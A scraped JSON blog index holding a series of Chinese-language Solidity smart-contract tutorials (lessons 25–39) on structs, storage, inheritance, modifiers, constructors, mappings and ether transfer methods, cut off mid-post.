solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[39]-结构体","slug":"solidity-39-struct","date":"2018-11-23T02:19:26.000Z","updated":"2018-11-23T12:59:16.963Z","comments":true,"path":"2018/11/23/solidity-39-struct/","link":"","permalink":"https://dreamerjonson.com/2018/11/23/solidity-39-struct/","excerpt":"","text":"struct语法 struct类似于对于一个对象属性的封装。例如一个学生，可能会有姓名、学号等属性。将这些属性封装起来，成为一个结构体。 1234struct 对象名&#123; 变量类型1 变量名1; 变量类型2 变量名2;&#125; struct声明 定义一个学生类 1234struct student&#123; uint grade; string name; &#125; 结构体不能包含自身 12345struct student&#123; uint grade; string name; //student s;结构体不能包含自身 &#125; 结构体可以嵌套 一个结构体内部可以包含另一个结构体。 12345678910struct student&#123; uint grade; string name; &#125;struct student2&#123; uint grade; string name; student ss; //包含另一个结构体&#125; 结构体内部可以包含自身的动态数组 12345struct student3&#123; uint grade; string name; student3[] stu;//结构体内部可以包含自身的动态数组&#125; 结构体内部可以包含自身的mapping映射。 12345struct student4&#123; uint grade; string name; mapping(uint=&gt;student4) studentMap;&#125; struct实例化 定义一个结构体有多种方式 123456789struct student&#123; uint grade; string name; &#125;//方式一、将100、&quot;jackson&quot; 按顺序赋值给student。student(100,&quot;jackson&quot;)//方式二、按名字赋值student(&#123;name:&quot;jackson&quot;,grade:100&#125;) 完整代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647pragma solidity ^0.4.23;contract structTest&#123; struct student&#123; uint grade; string name; //student s; &#125; struct student2&#123; uint grade; string name; student ss; &#125; struct student3&#123; uint grade; string name; student ss; student3[] stu; &#125; struct student4&#123; uint grade; string name; student ss; student3[] stu; mapping(uint=&gt;student4) studentMap; &#125; function init() public pure returns(uint,string)&#123; student memory s = student(100,\"jackson\"); student3[3] memory stu; return (s.grade,s.name); &#125; function init2() public pure returns(uint,string)&#123; student memory s = student(&#123;name:\"jackson\",grade:100&#125;); return (s.grade,s.name); &#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[38]-storage引用","slug":"solidity-38-storage","date":"2018-11-23T02:06:34.000Z","updated":"2018-11-23T12:59:07.629Z","comments":true,"path":"2018/11/23/solidity-38-storage/","link":"","permalink":"https://dreamerjonson.com/2018/11/23/solidity-38-storage/","excerpt":"","text":"storage引入 storage属性是一种引用类型。在如下的合约中，定义了动态长度数组arrx，arrx存储在以太坊虚拟机storage空间中的变量。 当调用test方法之后，定义了变量uint[] Z。这个时候，如果我们在remix浏览器中进行编译，我们会看到一个警告。因为默认的情况下，对于动态数组 会加上storage属性。也就是：uint[] storage x。storage属性是一种引用类型，其引用了以太坊虚拟机storage空间中的状态变量。而不是对于值的拷贝 因此，在test函数中，当修改了Z的长度和Z的内容之后，再次查看arrx的长度和内容，会发现对应发生了变化。 123456789101112131415161718192021222324pragma solidity ^0.4.23;contract storageStart&#123; uint[] public arrx=[1,2,3,4,5]; function test() public&#123; uint[] Z = arrx; Z[0] = 100; Z.length = 10; &#125; function getLength() public view returns(uint)&#123; return arrx.length; &#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[37]-以太坊虚拟机数据存储","slug":"solidity-37-evm-datastorage","date":"2018-11-22T15:31:21.000Z","updated":"2018-11-23T12:58:47.968Z","comments":true,"path":"2018/11/22/solidity-37-evm-datastorage/","link":"","permalink":"https://dreamerjonson.com/2018/11/22/solidity-37-evm-datastorage/","excerpt":"","text":"EVM 当调用solidity函数时，都会在以太坊虚拟机当中来执行。因此了解以太坊虚拟机的细节，了解其数据的存储机制变得尤为重要。 以太坊虚拟机中的空间分为3大部分。分别为storage、stack与memory。 storage空间非常特殊，其值会被矿工提交到区块链上，改变区块链的状态。 下面我们将分析下面例子中，每一个变量所在以太坊evm中的位置。 下面的例子中，在运行合约中的代码时，变量a会存储在以太坊evm的storage空间中。其实所有的状态变量都会存储在storage空间中。 add函数中的函数参数num存储在memory空间中。 在函数中定义的变量，如在test函数中的i、j都存储在stack空间中。 当调用cahngeIt函数时，会修改storage空间中的a值。 当调用add函数时，会将memory空间中的num值加1. 当调用test方法时，会在stack中开辟空间i、j。i赋值为2. j赋值为add函数的返回值3. 1234567891011121314151617181920contract storageAndMemory&#123; uint a = 5; function changeIt() public &#123; a = 1000; &#125; function add(uint num) public returns(uint)&#123; num = num +1; return num; &#125; function test() public returns(uint,uint)&#123; uint i = 2; uint j = add(i); return(i,j); &#125;&#125; 总结 1234567状态变量总是存在于storage中函数的参数默认在memory中函数中的本地变量默认是在stack中storage与memory都需要消耗gas，但是storage更贵","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[36]-连续继承与多重继承","slug":"solidity-36-inheritdeep","date":"2018-11-22T11:50:18.000Z","updated":"2018-11-23T12:58:25.227Z","comments":true,"path":"2018/11/22/solidity-36-inheritdeep/","link":"","permalink":"https://dreamerjonson.com/2018/11/22/solidity-36-inheritdeep/","excerpt":"","text":"连续继承 合约可以被连续的继承，在下面的合约中，father继承了grandfather、son继承了father。那么son也同样继承了grandfather中的状态变量和方法。 12345678910111213contract grandfather&#123; uint public money=10000; function dahan() public pure returns(string)&#123; return &quot;dahan&quot;; &#125;&#125;contract father is grandfather&#123;&#125;contract son is father&#123;&#125; 连续继承重名问题 下面的合约中，grandfather合约与 father合约中状态变量的名字、函数的名字都是相同的，这时，son中的状态变量money和继承的函数 以父类father合约中的状态变量和函数为准。 12345678910111213141516171819202122pragma solidity ^0.4.23;contract grandfather&#123; uint public money=10000; function dahan() public pure returns(string)&#123; return \"dahan\"; &#125;&#125;contract father is grandfather&#123; uint public money=9999; function dahan() public pure returns(string)&#123; return \"alice\"; &#125;&#125;contract son is father&#123; function getMonry() returns(uint)&#123; return money; &#125;&#125; 多重继承 合约可以继承多个合约，也可以被多个合约继承。如下所示： 12345678910contract father&#123;&#125;contract mother&#123;&#125;contract son is father,mother&#123;&#125; 多重继承有重名 多重继承有重名时，继承的顺序时很重要的，以最后继承的为主。例如下面的例子中，son合约最后继承了mother，因此以mother合约中的money=8888为准。 123456789101112131415161718contract father is grandfather&#123; uint public money=9999; function dahan() public pure returns(string)&#123; return &quot;alice&quot;; &#125;&#125;contract mother&#123; uint public money=8888; uint public weight=100;&#125;contract son is father,mother&#123;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[35]-function-automatic","slug":"solidity-35-function-automatic","date":"2018-11-22T10:56:40.000Z","updated":"2018-11-23T12:58:20.391Z","comments":true,"path":"2018/11/22/solidity-35-function-automatic/","link":"","permalink":"https://dreamerjonson.com/2018/11/22/solidity-35-function-automatic/","excerpt":"","text":"自动生成函数 public属性的状态变量会自动的生成同名的函数。如果有何其一样的函数定义，则会替换掉默认的函数。 一般类型如int、bytes32、bool类型的函数会自动的生成同名的函数。 但是要注意的是，生成的函数的属性为external属性。 12345uint public num = 100;自动生成的函数为: function num() external pure returns(uint)&#123; return 200; &#125; 动态数组与mapping类型函数会自动生成带参数的函数： 12345mapping(uint =&gt;string) public map;//自动生成的函数function map(uint key) external view returns(string)&#123; return map[key];&#125; 复杂的自动生成函数 12345mapping(uint=&gt;mapping(uint=&gt;uint)) public grademap;//自动生成的函数function grademap(uint key1,uint key2) external view returns(uint)&#123; return grademap[key1][key2];&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[34]-合约继承与可见性","slug":"solidity-34-inherit","date":"2018-11-22T10:00:52.000Z","updated":"2018-11-23T12:58:15.601Z","comments":true,"path":"2018/11/22/solidity-34-inherit/","link":"","permalink":"https://dreamerjonson.com/2018/11/22/solidity-34-inherit/","excerpt":"","text":"继承 继承是面向对象语言的重要特征。继承是为了模拟现实中的现象，并且可以简化代码的书写。 例如猫与够都属于动物。他们都继承动物的某些特征。 继承语法 当前合约继承父类合约的属性和方法。 123456789101112131415161718192021222324252627contract 合约名 is 父类合约名&#123;&#125;``` ## 继承例子下面的例子中。直接部署son合约后，son合约继承了father合约的状态变量money与函数dahan，所以在son合约中，仍然可以访问或修改父类的状态变量和方法。同时，在son合约中，有属于自己特有的状态变量和方法。```jspragma solidity ^0.4.23;contract father&#123; uint public money =10000; function dahan() public returns(string)&#123; return &quot;dahan&quot;; &#125;&#125;contract son is father&#123; uint public girlfriend; //修改父类属性 function change() public&#123; money = 99; &#125;&#125; 继承与可见性 public 状态变量默认是public的类型，可以被继承，可以在外部与内部被调用 123456789contract father&#123; uint money = 10000;&#125;contract son is father&#123; function getMoney() public view returns(uint)&#123; return money; &#125;&#125; 函数默认为public属性,可以被继承，可以在外部与内部被调用 1234567891011contract father&#123; function dahan() pure returns(string)&#123; return &quot;dahan&quot;; &#125;&#125;contract son is father&#123; function test() public view returns(string)&#123; return dahan(); &#125;&#125; internal 当为状态变量添加了inernal属性，仍然可以被继承，internal属性只能够被合约中的方法调用，不能够在外部被直接调用。 123456789contract father&#123; uint internal money = 10000;&#125;contract son is father&#123; function getMoney() public view returns(uint)&#123; return money; &#125;&#125; 当为函数添加了inernal属性，仍然可以被继承，internal属性只能够被合约中的方法调用，不能够在外部被直接调用。 1234567891011contract father&#123; function dahan() internal pure returns(string)&#123; return &quot;dahan&quot;; &#125;&#125;contract son is father&#123; function test() public view returns(string)&#123; return dahan(); &#125;&#125; external 状态变量没有external属性，但是函数有。 当为函数加上external属性后，意味着合约只能够在外部被调用，不能够在内部被调用。 如果想合约在内部被调用，需要使用到如下this.函数的方式： 12345678910111213contract father&#123; function dahan() external pure returns(string)&#123; return &quot;dahan&quot;; &#125;&#125;contract son is father&#123; function test() public view returns(string)&#123; return this.dahan(); &#125;&#125; 能够调用external的第二种方式。 12345678910111213contract father&#123; function dahan() external pure returns(string)&#123; return &quot;dahan&quot;; &#125;&#125;contract testExternal&#123; father f = new father(); function test() public view returns(string)&#123; return f.dahan(); &#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[33]-modifire-deep","slug":"solidity-33-modifire-deep","date":"2018-11-22T09:21:28.000Z","updated":"2018-11-23T12:58:10.123Z","comments":true,"path":"2018/11/22/solidity-33-modifire-deep/","link":"","permalink":"https://dreamerjonson.com/2018/11/22/solidity-33-modifire-deep/","excerpt":"","text":"带参modifire modifire还可以带参数，如下面的例子，模拟了游戏中的升级操作。如果玩家等级达到2级，就可以修改名字。如果玩家等级达到10级，就可以修改DNA。 通过带参数的modifire实现对于代码的封装。 12345678910111213141516171819202122pragma solidity^0.4.23;contract modifiererParam&#123; uint public level = 9; string public name; uint public DNA; modifier controlLevel(uint _needlevel)&#123; require(level&gt;_needlevel); _; &#125; //修改名字 function changeName(string _name) public controlLevel(2)&#123; name = _name; &#125; //修改DNA function changeDNA(uint _dna) public controlLevel(10)&#123; DNA = _dna; &#125;&#125; 通过上面的例子，我们能够看到带参数的modifire的使用方法。首先在modifire中添加参数。接着在函数定义中，在修饰符与return返回值之间加上controlLevel(传递的参数). 例如，当调用changeName函数执行的语句为： 12require(level&gt;2);name = _name; 例如，当调用changeDNA函数执行的语句为： 12require(level&gt;10);name = _name; 多重modifire 函数可以有多个modifire，这种情况要相对复杂得多。 我们从下面的例子，来讲解多重modifire的执行过程。 案例1 123456789101112131415contract mulmodifiererDeep&#123; uint public a = 0; modifier mod1&#123; a = 1; _; a = 2; &#125; function test() public mod1&#123; a = 100; &#125;&#125; 下面的例子中，当执行test方法后，状态变量a的值会变为2. 我们提到过，modifire中的下划线指代了函数中的所有语句。 所以执行流程为 a = 1 a = 100 a = 2 案例2 下面的例子中，使用了多重的modire。 12345678910111213141516171819contract mulmodifiererDeep2&#123; uint public a = 0; modifier mod1&#123; a = 1; _; a = 2; &#125; modifier mod2&#123; a = 3; _; a = 4; &#125; function test() public mod1 mod2&#123; a = 100; &#125;&#125; 在上面的例子中test函数使用了modifire：mod1、mod2 嵌套规则为，首先函数中的a = 100嵌套到mod2的_中。整个语句变为了 a = 3; a = 100; a = 4; 接下来，将上面的语句添加到mod1的下划线中，所以整个执行语句变为了 12345a = 1;a = 3;a = 100;a = 4;a = 2; 最后执行结果为 a = 2。 案例3 多重modifire的顺序非常的重要的。 下面的例子，和案例2相同但是修改了mod1与mod2在函数中的顺序。 12345678910111213141516171819contract mulmodifiererDeep2&#123; uint public a = 0; modifier mod1&#123; a = 1; _; a = 2; &#125; modifier mod2&#123; a = 3; _; a = 4; &#125; function test() public mod2 mod1&#123; a = 100; &#125;&#125; 在上面的例子中test函数使用了modifire：mod2、mod1 嵌套规则为，首先函数中的a = 100嵌套到mod1的_中。整个语句变为了 a = 1; a = 100; a = 2; 接下来，将上面的语句添加到mod1的下划线中，所以整个执行语句变为了 12345a = 3;a = 1;a = 100;a = 2;a = 4; 最后执行结果为 a = 4。","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[32]-函数modifire","slug":"solidity-32-modifire","date":"2018-11-22T08:32:55.000Z","updated":"2018-11-23T12:57:55.381Z","comments":true,"path":"2018/11/22/solidity-32-modifire/","link":"","permalink":"https://dreamerjonson.com/2018/11/22/solidity-32-modifire/","excerpt":"","text":"函数modifire 函数modifire用于在执行函数前，执行某些初始化的操作。例如权限的判断。 modifire可以起到封装的作用，简化代码的书写。 modifire的定义 添加modifire关键字， 在花括号内部输入语句，并在最后加上下划线_。 1234modifier 函数名()&#123; 语句; _;&#125; modifire使用 modifire的使用方法是，将modifer的名字加在函数修饰符与返回值之间，如下所示 12345678910111213modifier OnlyOwner()&#123; require(msg.sender==owner); _;&#125;function changeIt(uint _num) public OnlyOwner&#123; a = _num;&#125; function getIt() view public OnlyOwner returns(address) &#123; return owner;&#125; 对于上面加上了modifire的函数changeIt和getIt。 changeIt函数的执行流程为 首先执行require(msg.sender==owner)，再执行函数体内部的所有语句，这里是 a = _num。 所以，modifier中的下划线其实是指代的函数体内部所有语句。在执行函数内部代码前，会先执行modifire中的语句。","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[31]-构造函数","slug":"solidity-31-constructor","date":"2018-11-22T08:07:29.000Z","updated":"2018-11-23T12:57:59.047Z","comments":true,"path":"2018/11/22/solidity-31-constructor/","link":"","permalink":"https://dreamerjonson.com/2018/11/22/solidity-31-constructor/","excerpt":"","text":"构造函数的作用 构造函数是特殊的函数，在部署合约的时候，就会被调用。而且只能够在此时被调用。 常常用于对于某一些状态变量的初始化。 构造函数 在老版本的solidity编译器中，构造函数是和合约名字同名的 1234567891011contract ontractinit&#123;uint public a ;//无参数的构造函数function ontractinit() public&#123; a = 100;&#125;//带参数的构造函数 function ontractinit(uint _a,uint _b) public&#123; a = _a;&#125; 新版本的solidity编译器中，使用关键词constructor作为构造函数 12345678910111213uint public a ;address public owner;// 将部署者地址存储到owner变量constructor() public &#123; owner = msg.sender;&#125;//带参构造函数constructor(uint _a) public&#123; a = _a;&#125; 完整代码 1234567891011121314151617181920pragma solidity ^0.4.23;contract ontractinit&#123; // function ontractinit() public&#123; // a = 100; // &#125; // function ontractinit(uint _a,uint _b) public&#123; // a = _a; // &#125; uint public a ; address public owner; constructor(uint _a) public&#123; a = _a; &#125; constructor() public &#123; owner = msg.sender; &#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[30]-值拷贝","slug":"solidity-30-value-copy","date":"2018-11-22T07:38:23.000Z","updated":"2018-11-23T12:58:03.276Z","comments":true,"path":"2018/11/22/solidity-30-value-copy/","link":"","permalink":"https://dreamerjonson.com/2018/11/22/solidity-30-value-copy/","excerpt":"","text":"状态变量的值拷贝问题 如下例子中，将状态变量a的值赋值给状态变量b。a与b都是以太坊虚拟机storage中不同的两个空间，所以当调用change方法修改b的值的时候，不会影响到a空间中的值。 1234567uint public a = 100;uint public b = a ;function change() public &#123; b = 999;&#125; 函数体内部变量的值拷贝 在函数体内部，将状态变量a的值赋值给状态变量b。a与b都是以太坊虚拟机栈中不同的两个空间。所以当修改b的值的时候，不会影响到a空间中的值。 123456function change2() public pure returns(uint,uint)&#123; uint a1 = 100; uint b1 = a1; b1 = 999; return (a1,b1);&#125; 函数参数的值拷贝问题 在下面的例子中，test函数调用了change函数，并传递了参数a。 传递的参数a会赋值给以太坊虚拟机memory空间中的变量num。由于函数的参数num和状态变量a是不同的两个空间。仅仅是将a的值赋值给了num。所以对于变量num值的修改不会改变a变量的值 12345678910uint public a = 100;function change(uint num) public returns(uint)&#123; num++; return num;&#125;function test() returns(uint)&#123; uint result = change3(a); return result;&#125; 完整代码 1234567891011121314151617181920212223242526272829303132333435pragma solidity ^0.4.23;contract valueCopy&#123; uint public a = 100; uint public b = a ; function change() public &#123; b = 999; &#125; function change2() public pure returns(uint,uint)&#123; uint a1 = 100; uint b1 = a1; b1 = 999; return (a1,b1); &#125; function change3(uint num) public returns(uint)&#123; num++; return num; &#125; function test() returns(uint)&#123; uint result = change3(a); return result; &#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[29]-函数作用域","slug":"solidity-29-function-scpoe","date":"2018-11-22T07:23:01.000Z","updated":"2018-11-23T12:57:17.759Z","comments":true,"path":"2018/11/22/solidity-29-function-scpoe/","link":"","permalink":"https://dreamerjonson.com/2018/11/22/solidity-29-function-scpoe/","excerpt":"","text":"函数重名与函数作用域问题 1、当状态变量中已经有了一个变量a、状态变量中就不能够再有一个同名的状态变量。 2、当状态变量中和函数体内部已经有了都有一个同名的函数的时候，默认处理的是函数体内部的变量。也就是说，变量的操作和其他语言一样，仍然满足就近原则。 12345678910uint public a = 100;uint b = 200;// uint public a = 999; 当状态变量中已经有了一个变量a、状态变量中就不能够再有一个同名的状态变量。function scopeTest() pure public returns(uint)&#123; uint a = 88; a = 77; //修改的是函数体内部的a return a ;//返回的是函数体内部的a。&#125; 3、在函数的参数中，可以有和状态变量同名的函数a。 但是一旦函数中参数中有了变量名字为a，函数体内部的任何位置都不能再次有对于a的定义。 1234567891011121314151617181920function scopeTest2(uint a) pure public returns(uint)&#123; //错误1// uint a = 0; //错误2// for(uint a = 0;a&lt;8;a++)&#123;// &#125;//错误3:&#123; // uint a = 0; a = 99; //可以修改 return a ;//可以返回&#125;&#125; 完整代码 123456789101112131415161718192021222324252627282930pragma solidity ^0.4.23;contract scope&#123; uint public a = 100; uint b = 200; // uint public a = 999; function scopeTest() pure public returns(uint)&#123; uint a = 88; a = 77; return a ; &#125; function scopeTest2(uint a) pure public returns(uint)&#123; // uint a = 0; // for(uint a = 0;a&lt;8;a++)&#123; // &#125; &#123; // uint a = 0; a = 99; return a ; &#125; &#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[28]-函数返回值","slug":"solidity-28-function-return","date":"2018-11-22T03:34:41.000Z","updated":"2018-11-23T12:57:02.217Z","comments":true,"path":"2018/11/22/solidity-28-function-return/","link":"","permalink":"https://dreamerjonson.com/2018/11/22/solidity-28-function-return/","excerpt":"","text":"函数返回值一般形式 12345678910function resValue() pure public returns(uint)&#123; uint a = 10; return a;&#125;function recieveValue() pure public returns(uint)&#123; uint b; b = resValue(); return b;&#125; 函数命名返回值 12345678910111213//1、直接赋值、不需要return返回function resValue2() pure public returns(uint num1)&#123; num1 = 100;&#125;//2、如果有return，以return为准function resValue3() pure public returns(uint num1)&#123; num1 = 100; return 99;&#125;//3、不return，也不赋值，那么为0function resValue4() pure public returns(uint num1)&#123; uint b = 88;&#125; 函数多返回值 solidity语言支持函数的多返回值。 12345678910function mulvalue(uint a,uint b) pure public returns(uint,uint)&#123; uint add = a+b; uint mul = a*b; return (add,mul);&#125;//命名返回值+多返回值 function mulvalue2(uint a,uint b) pure public returns(uint add,uint mul)&#123; add = a+b; mul = a*b;&#125; 案例：多返回值实现参数的反转 状态变量resA、resB传递过来之后。函数reverse2将会使得函数 12345678910function reverse(uint a,uint b) returns(uint ,uint)&#123; return (b,a);&#125; uint public resA = 0; uint public resB = 0; function reverse2(uint a,uint b) &#123; (resA,resB) = reverse(a,b);&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[27]-函数与函数重载","slug":"solidity-27-function-overload","date":"2018-11-20T16:08:43.000Z","updated":"2018-11-20T16:36:23.104Z","comments":true,"path":"2018/11/21/solidity-27-function-overload/","link":"","permalink":"https://dreamerjonson.com/2018/11/21/solidity-27-function-overload/","excerpt":"","text":"函数的一般形式 1function (&lt;parameter types&gt;) &#123;public|internal|external&#125; [pure|constant|view|payable] [returns (&lt;return types&gt;)] 函数的作用 1、与区块链交互 2、本地执行 3、封装代码 带参数函数 1234567uint public num; string public name; function setparam(uint _num,string _name) public &#123; num = _num; name = _name; &#125; 带参函数调用—函数命名参数 12345678910111213141516171819202122232425262728293031323334pragma solidity ^0.4.23;contract funcParam&#123; //状态变量 uint public num; string public name; //代餐函数 function setparam(uint _num,string _name) public &#123; num = _num; name = _name; &#125; //调用 function Test() public &#123; setparam(99,&quot;bob&quot;); &#125; //函数命名参数 function Test2() public &#123; setparam(&#123;_num:99,_name:&quot;bob&quot;&#125;); &#125; function Test3() public &#123; setparam(&#123;_name:&quot;Alice&quot;,_num:999&#125;); &#125; //错误代码，参数个数不匹配 // function Test4() public &#123; // setparam(100); // &#125;&#125; 函数重载 在一个合约中有相同名字的函数，就是函数的重载。 重载必须要函数的类型与长度都不相同。 下面的例子都是错误的写法 错误1 1234567function fun()&#123;&#125; function fun()&#123;&#125; 错误2 1234567function fun() returns(uint)&#123; &#125; function fun() returns(bytes1)&#123; &#125; 错误3 1234567 function fun() returns(uint)&#123;&#125; function fun()&#123;&#125; 正确1 1234567function fun(uint k) public pure&#123; &#125;function fun() public pure&#123;&#125; 正确2 1234567function fun2(uint a) public pure&#123;&#125;function fun2(bytes1 b) public pure&#123;&#125; 例子剖析1 在下面的例子中，fun3有两个重载的函数。函数test不能够调用fun3(2)，因为不能够明确到底是要调用哪一个。 fun3(256)能够执行成功。因为256超过了int8的最大值，只能够调用fun3(uint a). 如果想明确，可以强制的转换,例如uint256(2)。 12345678910111213function fun3(uint a) public &#123; num = 256;&#125;function fun3(uint8 b) public&#123; num = 8;&#125; function test() public&#123; //fun3(2);错误，不明确 fun3(256); fun3(uint256(2));&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[26]-mapping","slug":"solidity-26-mapping","date":"2018-11-20T15:39:16.000Z","updated":"2018-12-06T00:59:04.915Z","comments":true,"path":"2018/11/20/solidity-26-mapping/","link":"","permalink":"https://dreamerjonson.com/2018/11/20/solidity-26-mapping/","excerpt":"","text":"mapping mapping是一张表，存储key-value对。更准确的说，mapping是一张hash映射表，内部并没有存储真实的key值。 123Mappings can be seen as hashtables which are virtually initialized such that every possible key exists and is mapped to a value whose byte-representation is all zeros: a type’s default value. The similarity ends here, though: The key data is not actually stored in a mapping, only its keccak256 hash used to look up the value.Because of this, mappings do not have a length or a concept of a key or value being “set”. mapping用例 下面的案例模拟了一个登陆网站，将地址与id绑定在一起。id又与姓名绑定在一起。 123456789101112131415161718192021222324pragma solidity ^0.4.23;contract mappingTest&#123; uint id = 0; mapping(address =&gt;uint) idmap;//将地址与id绑定在一起 mapping(uint =&gt;string) namemap;//id又与姓名绑定在一起。 //注册 function regist(string name) public&#123; address acount = msg.sender; id++; idmap[acount] = id; namemap[id] = name; &#125; //根据地址获取id function getIdByAddress(address _address) public view returns(uint)&#123; return idmap[_address]; &#125; //根据id获取名字 function getNameByID(uint _id) public view returns(string)&#123; return namemap[_id]; &#125;&#125;","categories":[{"name":"智能合约 solidity语法","slug":"智能合约-solidity语法","permalink":"https://dreamerjonson.com/categories/智能合约-solidity语法/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://dreamerjonson.com/tags/solidity/"},{"name":"智能合约","slug":"智能合约","permalink":"https://dreamerjonson.com/tags/智能合约/"},{"name":"以太坊","slug":"以太坊","permalink":"https://dreamerjonson.com/tags/以太坊/"}]},{"title":"solidity智能合约[25]-转账的3种方式与比较","slug":"solidity-25-thansfer2","date":"2018-11-20T15:30:57.000Z","updated":"2018-11-20T16:36:38.297Z","comments":true,"path":"2018/11/20/solidity-25-thansfer2/","link":"","permalink":"https://dreamerjonson.com/2018/11/20/solidity-25-thansfer2/","excerpt":"","text":"转账的3种方式 123address.transfer()address.send()address.call.value().gas()() 转账transfer 12345678910function transfer(address _address) public payable&#123; _address.transfer(msg.value); &#125; function transfer2(address _address) public payable&#123; _address.transfer(10 * 10**18); &#125; 转账send 123function transfer4(address _address) public payable &#123; _address.send(10 ether); &#125; 转账call 123function transfer5(address _address) public payable returns(bool)&#123; return 